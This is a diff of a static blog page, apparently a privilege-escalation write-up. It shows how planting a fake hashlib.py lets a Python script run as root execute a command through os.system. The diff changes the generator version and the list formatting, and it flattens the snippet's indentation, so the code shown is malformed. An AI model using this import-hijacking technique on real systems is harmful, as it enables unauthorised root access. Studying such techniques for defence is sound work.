@@ -74,7 +74,7 @@
 
 
 <script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
- <meta name="generator" content="Hugo 0.54.0" />
+ <meta name="generator" content="Hugo 0.55.6" />
         
 
         
@@ -184,16 +184,17 @@ print md5.digest()
 
 <ul>
 <li>In the working directory, create a filed called <code>hashlib.py</code> which will get loaded after running the above code.</li>
-<li>Add this constructor code to the created file:</li>
-</ul>
+
+<li><p>Add this constructor code to the created file:</p>
 
 <pre><code>class md5():
-   def _init_(self):
-      print &quot;loaded md5, hijacking&quot;
-      import os
-      os.system(&quot;id&quot;)
-      print &quot;done&quot;
-</code></pre>
+def _init_(self):
+  print &quot;loaded md5, hijacking&quot;
+  import os
+  os.system(&quot;id&quot;)
+  print &quot;done&quot;
+</code></pre></li>
+</ul>
 
 <p>By manipulating the call to <code>hashlib.md5()</code>, the <code>id</code> command has been executed as root.</p>
 
